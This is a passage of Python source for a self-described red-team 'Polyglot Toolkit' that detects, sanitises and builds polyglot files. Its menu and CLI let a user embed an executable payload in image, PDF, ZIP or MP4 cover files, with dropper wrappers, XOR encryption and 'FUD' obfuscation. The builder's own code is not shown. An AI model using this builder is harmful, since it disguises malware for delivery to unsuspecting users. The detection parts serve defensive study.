        if ct in ('HTML',) and ext not in ('.html','.htm','.php','.xhtml','.svg'):
            findings.append({'type':'MIME_CONFUSION',
                'detail':f'HTML content in {ext} file — executable payload','severity':'critical','offset':0})

        return findings

    def _find_mp4_end(self, data: bytes) -> int:
        """Find the end of valid MP4 atoms. Returns offset of trailing data."""
        offset = 0
        last_valid = 0
        # Top-level MP4 atom types
        known_atoms = {b'ftyp', b'moov', b'mdat', b'free', b'edts',
                       b'mdat', b'wide', b'skip', b'udta', b'pdin',
                       b'mvhd', b'trak', b'uuid', b'ftyp'}
        while offset + 8 <= len(data):
            try:
                size = struct.unpack('>I', data[offset:offset+4])[0]
                atom_type = data[offset+4:offset+8]
                if size < 8 or offset + size > len(data):
                    break
                if atom_type in known_atoms or atom_type.isalpha():
                    last_valid = offset + size
                    offset += size
                else:
                    break
            except Exception:
                break
        return last_valid

    def _is_safe_trailing(self, ext, ct, trailing):
        """Check if trailing data is safe metadata (not a polyglot payload)."""
        safe_patterns = {
            '.pdf': [b'<?xpacket', b'<x:xmpmeta', b'%AI12_PaperData',
                     b'\x00' * 8, b'%%Page', b'startxref'],
            '.png': [b'tEXt', b'zTXt', b'iTXt', b'pHYs', b'tIME',
                     b'cHRM', b'gAMA', b'iCCP', b'sRGB'],
            '.jpg': [b'\xff\xee', b'\xff\xe2', b'ICC_PROFILE'],
            '.gif': [b'NETSCAPE', b'Application'],
        }
        for pat in safe_patterns.get(ext, []):
            if trailing[:len(pat)+20].startswith(pat):
                return True
        # Check RAW bytes for payload signatures BEFORE stripping nulls
        # This catches "MZ\x90\x00..." where stripping reduces to 3 bytes
        PAYLOAD_SIGS = [b'MZ', b'\x7fELF', b'PK', b'%PDF', b'\xff\xd8',
                        b'\x89PNG', b'GIF8', b'Rar!', b'\x37\x7a\xbc\xaf',
                        b'<!doctype', b'<html', b'<script', b'#!/', b'BM']
        raw_prefix = trailing[:32].lower()
        for sig in PAYLOAD_SIGS:
            if raw_prefix[:len(sig)].startswith(sig.lower()):
                return False
        # Also safe if it's only whitespace/nulls (< 64 bytes)
        stripped = trailing.strip(b'\x00\r\n\t ')
        if len(stripped) < 16:
            return True
        return False


# ── Sanitizer Engine ─────────────────────────────────────────

class PolyglotSanitizer:
    # Patterns that are SAFE trailing data (not polyglot payloads)
    SAFE_TRAILING = {
        '.pdf': [
            b'<?xpacket',          # Adobe/Canva XMP metadata
            b'<x:xmpmeta',         # XMP metadata block
            b'%AI12_PaperData',    # Adobe Illustrator
            b'\x00' * 8,           # PDF padding (common in Canva exports)
            b'%%Page',             # PostScript trailer
            b'startxref',          # Incremental save
        ],
        '.png': [
            b'tEXt',               # PNG text metadata
            b'zTXt',               # Compressed text metadata
            b'iTXt',               # International text metadata
            b'pHYs',               # Physical pixel dimensions
            b'tIME',               # Last modification time
            b'cHRM',               # Chromaticity
            b'gAMA',               # Gamma
            b'iCCP',               # ICC color profile
            b'sRGB',               # sRGB color space
        ],
        '.jpg': [
            b'\xff\xee',           # Adobe APP14 marker
            b'\xff\xe2',           # APP2 (ICC profile)
            b'ICC_PROFILE',        # ICC color profile
        ],
        '.gif': [
            b'NETSCAPE',           # GIF animation extension
            b'Application',        # GIF application extension
        ],
    }

    PAYLOAD_SIGS = [b'MZ', b'\x7fELF', b'PK', b'%PDF', b'\xff\xd8',
                     b'\x89PNG', b'GIF8', b'Rar!', b'\x37\x7a\xbc\xaf',
                     b'<!doctype', b'<html', b'<script', b'#!/', b'BM',
                     b'\xca\xfe\xba\xbe', b'\xfe\xed\xfa', b'\x4c\x00\x00\x00']

    def _is_safe_trailing(self, ext, trailing_data):
        """Check if trailing data is a known benign pattern (not a polyglot payload)."""
        # Empty or trivially small trailing data is safe
        if len(trailing_data) < 2:
            return True
        # Check SAFE_TRAILING patterns first (known benign metadata)
        patterns = self.SAFE_TRAILING.get(ext, [])
        for pat in patterns:
            if trailing_data[:len(pat)+20].startswith(pat):
                return True
        # Check RAW bytes for payload signatures BEFORE stripping nulls
        # This catches "MZ\x90\x00..." where stripping would reduce "MZ\x90" to 3 bytes
        raw_prefix = trailing_data[:32].lower()
        for sig in self.PAYLOAD_SIGS:
            if raw_prefix[:len(sig)].startswith(sig.lower()):
                return False
        # If trailing data is ONLY whitespace/nulls, it's safe
        stripped = trailing_data.strip(b'\x00\r\n\t ')
        if len(stripped) < 4:
            return True
        return False

    def _find_mp4_end(self, data: bytes) -> int:
        """Find the end of valid MP4 atoms. Returns offset of trailing data."""
        import struct as _struct
        offset = 0
        last_valid = 0
        known_atoms = {b'ftyp', b'moov', b'mdat', b'free', b'edts',
                       b'wide', b'skip', b'udta', b'pdin', b'uuid'}
        while offset + 8 <= len(data):
            try:
                size = _struct.unpack('>I', data[offset:offset+4])[0]
                atom_type = data[offset+4:offset+8]
                if size < 8 or offset + size > len(data):
                    break
                if atom_type in known_atoms or atom_type.isalpha():
                    last_valid = offset + size
                    offset += size
                else:
                    break
            except Exception:
                break
        return last_valid

    def sanitize(self, filepath, backup=True):
        with open(filepath, 'rb') as f:
            data = f.read()
        orig = len(data)
        ext = os.path.splitext(filepath)[1].lower()
        cleaned = None
        detected = None

        # Detect content type (handles leading whitespace/padding)
        stripped = data.lstrip()
        ct = None
        if stripped[:2]==b'\xff\xd8': ct='JPEG'
        elif stripped[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif stripped[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif stripped[:4]==b'%PDF': ct='PDF'
        elif stripped[:2]==b'PK': ct='ZIP'
        elif stripped[:2]==b'MZ': ct='PE'
        elif stripped[:4]==b'\x7fELF': ct='ELF'
        elif stripped[:15].lower().startswith((b'<!doctype',b'<html',b'<?php',b'<?xml',b'<%')): ct='HTML'
        elif b'ftyp' in stripped[:20]: ct='MP4'

        # Extension/content mismatch — file is disguised, can't auto-sanitize
        ext_map = {'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
                   '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4'}
        expected = ext_map.get(ext)
        if expected and ct and expected != ct:
            return {'status':'danger',
                    'detail':f'POLYGLOT: {ext} file contains {ct} content — cannot auto-sanitize, recommend quarantine',
                    'removed':0,'content_type':ct,'expected_type':expected}

        # handlers: exts -> (name, end_marker, extra_bytes, min_offset)
        handlers = {('.jpg','.jpeg'):('JPEG',b'\xff\xd9',2,64),('.png',):('PNG',b'IEND',8,64),
                    ('.gif',):('GIF',b'\x3b',1,64),('.pdf',):('PDF',b'%%EOF',5,0)}
        for exts,(name,m,extra,min_off) in handlers.items():
            if ext in exts or (ct and ct == name):
                # Use find (first occurrence) not rfind — polyglot payloads may
                # contain end markers, rfind would find those instead of the real one
                pos = data.find(m, min_off)
                if pos!=-1 and pos+extra<=len(data):
                    trailing = data[pos+extra:]
                    # Check if trailing data is safe (metadata, not payload)
                    if self._is_safe_trailing(ext, trailing):
                        return {'status':'clean','detail':f'{name}: safe trailing metadata ({len(trailing):,} bytes)',
                                'removed':0,'safe_metadata':True}
                    cleaned = data[:pos+extra]; detected = name
                break

        if ext=='.zip' or data[:2]==b'PK':
            eocd = data.rfind(b'\x50\x4b\x05\x06')
            if eocd!=-1 and eocd+22<len(data):
                cleaned = data[:eocd+22]; detected = 'ZIP'

        # MP4: strip trailing data after last valid atom
        if ext=='.mp4' or ct=='MP4':
            mp4_end = self._find_mp4_end(data)
            if mp4_end > 0 and mp4_end < len(data):
                trailing = data[mp4_end:]
                if len(trailing) > 16:
                    cleaned = data[:mp4_end]; detected = 'MP4'

        if cleaned is None or len(cleaned)>=orig:
            return {'status':'clean','detail':f'{detected or "Unknown"}: clean','removed':0}

        if backup: shutil.copy2(filepath, filepath+'.bak')
        with open(filepath,'wb') as f: f.write(cleaned)
        return {'status':'sanitized','detail':f'{detected}: {orig-len(cleaned):,} bytes removed',
                'removed':orig-len(cleaned),'backup':filepath+'.bak' if backup else None}


# ── TUI Application ─────────────────────────────────────────

BANNER_V3 = """
[red]╔══════════════════════════════════════════════════════════════╗[/red]
[red]║[/red]  [bold white]◆ POLYGLOT TOOLKIT v3.0[/bold white]                                [red]║[/red]
[red]║[/red]  [dim]Red Team + Shield Edition[/dim]                                [red]║[/red]
[red]║[/red]  [dim]Author: Mr-DS-ML-85[/dim]                                      [red]║[/red]
[red]╚══════════════════════════════════════════════════════════════╝[/red]"""

DISCLAIMER_TUI = "[bold yellow]⚠  FOR EDUCATIONAL & AUTHORIZED TESTING ONLY[/bold yellow]"


class PolyglotTUI:
    def __init__(self):
        self.builder = PolyglotBuilder()
        self.detector = PolyglotDetector()
        self.sanitizer = PolyglotSanitizer()
        self.stats = {'scanned':0,'threats':0,'sanitized':0,'built':0}
        self.alerts = deque(maxlen=50)

    def safe_input(self, prompt_text, default=None, choices=None):
        """Input with KeyboardInterrupt handling."""
        try:
            if choices:
                return Prompt.ask(prompt_text, choices=choices, default=default)
            else:
                return Prompt.ask(prompt_text, default=default)
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]Cancelled.[/dim]")
            return None

    def safe_confirm(self, prompt_text, default=True):
        """Confirm with KeyboardInterrupt handling."""
        try:
            return Confirm.ask(prompt_text, default=default)
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]Cancelled.[/dim]")
            return None

    def banner(self):
        if not HAS_RICH:
            print("Polyglot Toolkit v3.0 — Red Team + Shield Edition")
            return

        console.print(BANNER_V3)
        console.print(f"  {DISCLAIMER_TUI}\n")

    def main_menu(self):
        self.banner()
        while True:
            console.print()
            console.print(Panel.fit(
                "[bold white]MAIN MENU[/bold white]\n"
                "[dim]─────────────────────────────────────[/dim]\n\n"
                "  [bold red]1[/bold red] │ ◆  [white]Polyglot Builder[/white]\n"
                "  [bold red]2[/bold red] │ ⚠  [white]File Detector[/white]\n"
                "  [bold red]3[/bold red] │ 🛡  [white]File Sanitizer[/white]\n"
                "  [bold red]4[/bold red] │ ▶  [white]Real-Time Monitor[/white]\n"
                "  [bold red]5[/bold red] │ 📊 [white]Dashboard & Stats[/white]\n"
                "  [bold red]6[/bold red] │ 📋 [white]Activity Log[/white]\n"
                "  [bold red]7[/bold red] │ 🔓 [white]Recover .bak Files[/white]\n"
                "  [bold red]8[/bold red] │ 🖥  [white]Server Mode[/white]\n"
                "  [bold red]0[/bold red] │ ✕  [dim]Exit[/dim]\n",
                title="[bold red]◆ POLYGLOT[/bold red]",
                subtitle="[dim]v3.0 — Red Team + Shield Edition[/dim]",
                border_style="red",
                padding=(1, 2),
            ))

            choice = self.safe_input("\n[bold red]Select[/bold red]",
                                     choices=["0","1","2","3","4","5","6","7","8"],
                                     default="1")
            if choice is None:
                continue

            if choice == "0":
                console.print("\n[dim]Stay stealthy. ── Mr-DS-ML-85[/dim]\n")
                sys.exit(0)
            elif choice == "1":
                self.menu_builder()
            elif choice == "2":
                self.menu_detector()
            elif choice == "3":
                self.menu_sanitizer()
            elif choice == "4":
                self.menu_monitor()
            elif choice == "5":
                self.menu_dashboard()
            elif choice == "6":
                self.menu_log()
            elif choice == "7":
                self.menu_recover()
            elif choice == "8":
                self.menu_server()

    # ── Builder Menu ─────────────────────────────────────────

    def menu_builder(self):
        console.print()
        console.print(Panel("[bold red]◆ POLYGLOT BUILDER[/bold red]", border_style="red"))
        console.print(f"  {DISCLAIMER_TUI}\n")

        console.print("[bold]Attack Vectors:[/bold]")
        console.print("  [red]1[/red] │ Standard Polyglot (trailing data)")
        console.print("  [red]2[/red] │ FUD Cryptor (multi-layer obfuscation)")
        console.print("  [red]3[/red] │ MIME-Type Confusion")
        console.print("  [red]4[/red] │ Covert Archive Embedding")

        vector = self.safe_input("\n[bold red]Vector[/bold red]", choices=["1","2","3","4"], default="1")
        if vector is None: return

        cover = self.safe_input("[bold cyan]Cover file[/bold cyan] (JPEG/PNG/GIF/PDF/ZIP/MP4)")
        if cover is None: return
        if not os.path.isfile(cover):
            console.print(f"[red]✗ File not found: {cover}[/red]")
            return

        payload = self.safe_input("[bold cyan]Payload file[/bold cyan] (EXE/ELF/script)")
        if payload is None: return
        if not os.path.isfile(payload):
            console.print(f"[red]✗ File not found: {payload}[/red]")
            return

        containers = ['jpeg','png','gif','pdf','zip','mp4']
        container = self.safe_input("[bold cyan]Container type[/bold cyan]", choices=containers, default="jpeg")
        if container is None: return

        # Cross-platform payload wrapping
        console.print("\n[bold]Payload Wrapping:[/bold]")
        console.print("  [dim]0[/dim] │ None (raw embed)")
        console.print("  [red]1[/red] │ VBS dropper (Windows)")
        console.print("  [red]2[/red] │ PowerShell dropper (Windows)")
        console.print("  [red]3[/red] │ Bash dropper (Linux/macOS)")
        console.print("  [red]4[/red] │ POSIX sh dropper (Linux/macOS)")
        console.print("  [red]5[/red] │ Python dropper (cross-platform)")
        console.print("  [red]6[/red] │ AppleScript dropper (macOS)")
        console.print("  [red]7[/red] │ Excel macro (.xlsx)")
        console.print("  [red]8[/red] │ Word macro (.docx)")

        wrap_choice = self.safe_input("[bold cyan]Wrap type[/bold cyan]",
                                       choices=["0","1","2","3","4","5","6","7","8"], default="0")
        if wrap_choice is None: return

        payload_type_map = {
            "0": None, "1": "vbs", "2": "ps1", "3": "bash",
            "4": "sh", "5": "python", "6": "applescript",
            "7": "xlsx", "8": "docx",
        }
        payload_type = payload_type_map.get(wrap_choice)
        target_os = "windows"
        if payload_type in ('bash', 'sh', 'python', 'applescript'):
            target_os = "linux"
        elif payload_type in ('xlsx', 'docx'):
            target_os = self.safe_input("[bold cyan]Target OS[/bold cyan]",
                                         choices=["windows","macos"], default="windows")
            if target_os is None: return

        encrypt = self.safe_confirm("[bold cyan]XOR encrypt payload?[/bold cyan]", default=False)
        if encrypt is None: return
        fud = vector == "2"
        mime = vector == "3"

        output = self.safe_input("[bold cyan]Output file[/bold cyan]", default=f"polyglot.{container}")
        if output is None: return

        console.print()
        with Progress(SpinnerColumn(), TextColumn("[bold blue]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Building polyglot...", total=100)
            try:
                progress.update(task, advance=30)
                stats = self.builder.build(cover, payload, output,
                    container_type=container, encrypt=encrypt, fud=fud, mime_confuse=mime,
                    payload_type=payload_type, target_os=target_os)
                progress.update(task, advance=70)
            except Exception as e:
                console.print(f"\n[bold red]✗ ERROR: {e}[/bold red]")
                return

        progress.update(task, completed=100)

        console.print()
        table = Table(title="Build Result", box=box.ROUNDED, border_style="green")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="white")
        table.add_row("Output", stats['output'])
        table.add_row("Container", stats['container_type'])
        table.add_row("Cover Size", f"{stats['cover_size']:,} bytes")
        table.add_row("Payload Size", f"{stats['payload_size']:,} bytes")
        table.add_row("Output Size", f"{stats['output_size']:,} bytes")
        table.add_row("Payload Offset", f"0x{stats['payload_offset']:X}")
        table.add_row("Entropy", str(stats['entropy']))
        table.add_row("Encrypted", "✓" if stats['encrypted'] else "✗")
        table.add_row("FUD Protected", "✓" if stats['fud_protected'] else "✗")
        table.add_row("MIME Confusion", "✓" if stats['mime_confused'] else "✗")
        console.print(table)

        self.stats['built'] += 1
        console.print(f"\n[bold green]✓ Polyglot built successfully![/bold green]")
        Notifier.send("Polyglot Built", f"{container} polyglot created")

    # ── Detector Menu ────────────────────────────────────────

    def menu_detector(self):
        console.print()
        console.print(Panel("[bold yellow]⚠ POLYGLOT DETECTOR[/bold yellow]", border_style="yellow"))
        console.print("  [dim]Note: May produce false positives — always verify findings[/dim]\n")

        target = self.safe_input("[bold cyan]Target[/bold cyan] (file or directory)")
        if target is None: return
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                    '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4',
                    '.sh','.bash','.py','.rb','.pl','.applescript','.scpt',
                    '.xlsx','.xls','.pptx','.ppt','.rtf','.html','.hta','.wsf',
                    '.7z','.rar','.iso','.elf','.so','.dylib','.macho'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No scannable files found.[/yellow]")
            return

        console.print(f"\n[dim]Scanning {len(files)} files...[/dim]\n")

        # Try to load ML model
        ml_model = None
        try:
            from engines.model import PolyglotModel
            from engines.features import extract_features_from_file
            from pathlib import Path
            mpath = "models/polyglot_shield.cbm"
            if Path(mpath).exists():
                ml_model = PolyglotModel({'task_type': 'CPU'})
                ml_model.load(mpath)
        except Exception:
            pass

        threats = 0
        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Scanning...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                try:
                    findings = self.detector.scan_file(fpath)
                    self.stats['scanned'] += 1

                    # ML prediction
                    ml_str = ""
                    if ml_model and ml_model.is_loaded:
                        try:
                            feats = extract_features_from_file(fpath)
                            pred = ml_model.predict_single(feats)
                            ml_str = f"  [dim]ML: {pred['label']} {pred['risk_score']:.1f}% ({pred['risk_level']})[/dim]"
                        except Exception:
                            pass

                    if findings:
                        crit = [f for f in findings if f['severity'] in ('critical','high')]
                        if crit:
                            threats += len(crit)
                            self.stats['threats'] += len(crit)
                            console.print(f"  [bold red]⚠ {fname}[/bold red]")
                            for f in findings:
                                sev = f['severity']
                                styles = {'critical':'bold white on red','high':'bold red',
                                         'warning':'yellow','info':'blue'}
                                off = f" @ 0x{f['offset']:X}" if f.get('offset') else ""
                                console.print(f"    [{styles.get(sev,'white')}][{sev.upper()}][/{styles.get(sev,'white')}] "
                                            f"{f['type']}: {f['detail']}{off}")
                            if ml_str:
                                console.print(f"   {ml_str}")
                        else:
                            console.print(f"  [yellow]○ {fname}[/yellow] [dim]— minor warnings[/dim]")
                            if ml_str:
                                console.print(f"   {ml_str}")
                    else:
                        console.print(f"  [green]✓ {fname}[/green] [dim]— clean[/dim]")
                        if ml_str:
                            console.print(f"   {ml_str}")
                except Exception as e:
                    console.print(f"  [red]✗ {fname}[/red] [dim]— error: {e}[/dim]")

                progress.advance(task)

        console.print()
        if threats > 0:
            console.print(Panel(
                f"[bold red]⚠ {threats} THREATS FOUND[/bold red]\n"
                f"[dim]{len(files)} files scanned[/dim]\n"
                f"[yellow]⚠ Verify findings before taking action — false positives are possible[/yellow]",
                border_style="red", title="Scan Complete"
            ))
            Notifier.send("THREATS DETECTED", f"{threats} threats in {len(files)} files", "critical")
        else:
            console.print(Panel(
                f"[bold green]✓ ALL CLEAN[/bold green]\n"
                f"[dim]{len(files)} files scanned, no threats[/dim]",
                border_style="green", title="Scan Complete"
            ))

    # ── Sanitizer Menu ───────────────────────────────────────

    def menu_sanitizer(self):
        console.print()
        console.print(Panel("[bold green]🛡 POLYGLOT SANITIZER[/bold green]", border_style="green"))
        console.print("  [dim]Strips hidden data after file end markers (%%EOF, IEND, etc.)[/dim]")
        console.print("  [yellow]⚠ Creates .bak backups by default — keep them until verified[/yellow]\n")

        target = self.safe_input("[bold cyan]Target[/bold cyan] (file or directory)")
        if target is None: return
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        dry_run = self.safe_confirm("[bold cyan]Dry-run mode (preview only)?[/bold cyan]", default=False)
        if dry_run is None: return

        backup = True
        if not dry_run:
            backup = self.safe_confirm("[bold cyan]Create .bak backups?[/bold cyan]", default=True)
            if backup is None: return

        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.zip','.mp4',
                    '.sh','.bash','.py','.rb','.pl','.applescript','.scpt',
                    '.xlsx','.docx','.7z','.rar','.iso'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No sanitizable files found.[/yellow]")
            return

        if dry_run:
            console.print("[bold cyan]  [DRY-RUN MODE — no files will be modified][/bold cyan]\n")

        console.print(f"[dim]{'Previewing' if dry_run else 'Sanitizing'} {len(files)} files...[/dim]\n")

        sanitized = 0
        total_removed = 0

        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Scanning..." if dry_run else "Sanitizing...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                try:
                    result = self.sanitizer.sanitize(fpath, backup and not dry_run)
                    if result.get('safe_metadata'):
                        console.print(f"  [dim]○ {fname} — {result['detail']} (safe)[/dim]")
                    elif result['status'] == 'sanitized':
                        sanitized += 1
                        total_removed += result['removed']
                        if not dry_run:
                            self.stats['sanitized'] += 1
                        prefix = "[DRY-RUN] " if dry_run else ""
                        console.print(f"  [green]{'✓' if not dry_run else '○'} {prefix}{fname}[/green] — {result['detail']}")
                    else:
                        console.print(f"  [dim]○ {fname} — {result['detail']}[/dim]")
                except Exception as e:
                    console.print(f"  [red]✗ {fname} — {e}[/red]")
                progress.advance(task)

        console.print()
        mode = "[DRY-RUN] " if dry_run else ""
        if sanitized > 0:
            console.print(Panel(
                f"[bold green]{mode}🛡 {'Would sanitize' if dry_run else 'SANITIZED'}[/bold green]\n"
                f"[white]{sanitized}/{len(files)} files {'affected' if dry_run else 'cleaned'}[/white]\n"
                f"[dim]{total_removed:,} bytes of hidden data {'would be removed' if dry_run else 'removed'}[/dim]"
                + ("\n[yellow]⚠ .bak backups created — verify before deleting them[/yellow]" if not dry_run and backup else ""),
                border_style="green", title=f"{mode}Sanitization {'Preview' if dry_run else 'Complete'}"
            ))
            if not dry_run:
                Notifier.send("Sanitization Done", f"{sanitized} files cleaned")
        else:
            console.print(Panel(
                f"[bold blue]✓ ALL CLEAN[/bold blue]\n[dim]No hidden data found[/dim]",
                border_style="blue", title=f"{mode}Sanitization {'Preview' if dry_run else 'Complete'}"
            ))

    # ── Monitor Menu ─────────────────────────────────────────

    def menu_monitor(self):
        console.print()
        console.print(Panel("[bold cyan]▶ REAL-TIME MONITOR[/bold cyan]", border_style="cyan"))
        console.print("  [dim]Monitors directory for new/changed files and scans them[/dim]\n")

        directory = self.safe_input("[bold cyan]Watch directory[/bold cyan]",
                                   default=str(Path.home() / "Downloads"))
        if directory is None: return
        if not os.path.isdir(directory):
            console.print(f"[red]✗ Not a directory: {directory}[/red]")
            return

        console.print(f"\n[green]▶ Monitoring: {directory}[/green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")

        detector = self.detector
        file_hashes = {}
        scanned = 0
        threats = 0

        scan_exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                     '.zip','.exe','.dll','.scr','.bat','.cmd','.ps1','.vbs',
                     '.js','.hta','.lnk','.elf','.so','.mp4'}

        try:
            while True:
                for root, dirs, files in os.walk(directory):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for fname in files:
                        ext = os.path.splitext(fname)[1].lower()
                        if ext not in scan_exts:
                            continue
                        fpath = os.path.join(root, fname)
                        try:
                            st = os.stat(fpath)
                            cur = (st.st_mtime, st.st_size)
                        except OSError:
                            continue

                        prev = file_hashes.get(fpath)
                        if prev is None or prev != cur:
                            file_hashes[fpath] = cur
                            try:
                                findings = detector.scan_file(fpath)
                            except Exception:
                                continue
                            scanned += 1

                            crit = [f for f in findings if f['severity'] in ('critical','high')]
                            if crit:
                                threats += len(crit)
                                ts = datetime.now().strftime('%H:%M:%S')
                                console.print(f"[bold red]  [{ts}] ⚠ {fname}[/bold red]")
                                for f in crit[:3]:
                                    console.print(f"    [red]→ {f['detail']}[/red]")
                                Notifier.send(f"THREAT: {fname}", crit[0]['detail'][:100], "critical")
                            elif not findings:
                                console.print(f"  [dim]✓ {fname}[/dim]")

                time.sleep(3)
        except KeyboardInterrupt:
            console.print(f"\n\n[dim]Stopped. Scanned: {scanned} | Threats: {threats}[/dim]")

    # ── Dashboard ────────────────────────────────────────────

    def menu_dashboard(self):
        console.print()
        table = Table(title="📊 Dashboard", box=box.DOUBLE_EDGE, border_style="red",
                     title_style="bold white", padding=(0, 2))
        table.add_column("Metric", style="cyan", justify="right")
        table.add_column("Value", style="bold white", justify="center")
        table.add_column("Status", justify="center")

        s = self.stats
        table.add_row("🔍 Files Scanned", str(s['scanned']),
                     "[green]✓[/green]" if s['scanned'] > 0 else "[dim]—[/dim]")
        table.add_row("⚠ Threats Found", str(s['threats']),
                     "[red]⚠ ALERT[/red]" if s['threats'] > 0 else "[green]CLEAN[/green]")
        table.add_row("🛡 Files Sanitized", str(s['sanitized']),
                     "[green]✓[/green]" if s['sanitized'] > 0 else "[dim]—[/dim]")
        table.add_row("◆ Polyglots Built", str(s['built']),
                     "[yellow]●[/yellow]" if s['built'] > 0 else "[dim]—[/dim]")

        console.print(table)

        if self.alerts:
            console.print("\n[bold]Recent Alerts:[/bold]")
            for alert in list(self.alerts)[-10:]:
                console.print(f"  [red]⚠ {alert}[/red]")

    # ── Log ──────────────────────────────────────────────────

    def menu_log(self):
        console.print()
        if not self.alerts:
            console.print("[dim]No activity logged yet.[/dim]")
            return
        console.print(Panel("[bold]📋 Activity Log[/bold]", border_style="blue"))
        for entry in list(self.alerts):
            console.print(f"  {entry}")

    # ── Recovery Menu ────────────────────────────────────────

    def menu_recover(self):
        console.print()
        console.print(Panel("[bold cyan]🔓 RECOVER .BAK FILES[/bold cyan]", border_style="cyan"))
        console.print("  [dim]Restores files from .bak backups created by the sanitizer[/dim]\n")

        target = self.safe_input("[bold cyan]Directory to scan for .bak files[/bold cyan]")
        if target is None: return
        if not os.path.isdir(target):
            console.print(f"[red]✗ Not a directory: {target}[/red]")
            return

        dest_dir = self.safe_input("[bold cyan]Restore to (leave empty = original location)[/bold cyan]", default="")
        if dest_dir is None: return
        dest_dir = dest_dir.strip() or None

        # Find all .bak files
        bak_files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if f.endswith('.bak'):
                    bak_files.append(os.path.join(root, f))

        if not bak_files:
            console.print("[yellow]No .bak backup files found.[/yellow]")
            return

        console.print(f"\n  Found {len(bak_files)} backup file(s):\n")
        for bak in bak_files:
            original = bak[:-4]
            fname = os.path.basename(original)
            fsize = os.path.getsize(bak)
            console.print(f"  📄 {fname} ({fsize:,} bytes)")

        confirm = self.safe_confirm(f"\n[bold yellow]Restore all {len(bak_files)} files?[/bold yellow]", default=True)
        if not confirm:
            console.print("[dim]Cancelled.[/dim]")
            return

        restored = 0
        for bak in bak_files:
            original = bak[:-4]
            fname = os.path.basename(original)
            try:
                if dest_dir:
                    os.makedirs(dest_dir, exist_ok=True)
                    dest = os.path.join(dest_dir, fname)
                else:
                    dest = original
                shutil.copy2(bak, dest)
                console.print(f"  [green]✓ Restored: {fname}[/green]")
                restored += 1
            except Exception as e:
                console.print(f"  [red]✗ Failed: {fname} — {e}[/red]")

        console.print(f"\n  [bold]Restored {restored}/{len(bak_files)} files[/bold]")

    # ── Server Menu ──────────────────────────────────────────

    def menu_server(self):
        console.print()
        console.print(Panel("[bold cyan]🖥 SERVER MODE[/bold cyan]", border_style="cyan"))
        console.print("  [dim]Headless API + Web Dashboard[/dim]\n")

        port = self.safe_input("[bold cyan]Port[/bold cyan]", default="8888")
        if port is None: return
        host = self.safe_input("[bold cyan]Bind address[/bold cyan] (127.0.0.1 or 0.0.0.0)", default="127.0.0.1")
        if host is None: return

        console.print(f"\n[green]▶ Starting server on {host}:{port}[/green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")

        try:
            from server import main as server_main
            sys.argv = ['server.py', '--host', host, '--port', str(port)]
            server_main()
        except KeyboardInterrupt:
            console.print("\n\n[dim]Server stopped.[/dim]")
        except ImportError as e:
            console.print(f"[red]✗ Server dependencies not available: {e}[/red]")
            console.print("[dim]Install: pip install flask[/dim]")
        except Exception as e:
            console.print(f"[red]✗ Server error: {e}[/red]")


# ── Direct CLI Commands ──────────────────────────────────────

def cli_build(args):
    """polyglot build <cover> <payload> [options]"""
    if len(args) < 2:
        console.print("[red]Usage: polyglot build <cover> <payload> [--type jpeg] [--encrypt] [--fud] [--mime][/red]")
        return

    cover, payload = args[0], args[1]
    container = "jpeg"
    encrypt = fud = mime = False
    output = None

    i = 2
    while i < len(args):
        if args[i] == "--type" and i+1 < len(args):
            container = args[i+1]; i += 2
        elif args[i] == "--encrypt":
            encrypt = True; i += 1
        elif args[i] == "--fud":
            fud = True; i += 1
        elif args[i] == "--mime":
            mime = True; i += 1
        elif args[i] == "--output" and i+1 < len(args):
            output = args[i+1]; i += 2
        else:
            i += 1

    if not output:
        output = f"polyglot.{container}"

    b = PolyglotBuilder()
    try:
        stats = b.build(cover, payload, output, container, encrypt, fud, mime)
        if HAS_RICH:
            table = Table(box=box.ROUNDED, border_style="green")
            table.add_column("Property", style="cyan")
            table.add_column("Value")
            for k, v in stats.items():
                table.add_row(str(k), str(v))
            console.print(table)
        else:
            for k, v in stats.items():
                print(f"  {k}: {v}")
    except Exception as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(1)


def cli_scan(args):
    """polyglot scan <file_or_dir>"""
    if not args:
        print("Usage: polyglot scan <file_or_dir>", file=sys.stderr)
        return

    target = args[0]
    d = PolyglotDetector()

    if os.path.isfile(target):
        files = [target]
    elif os.path.isdir(target):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
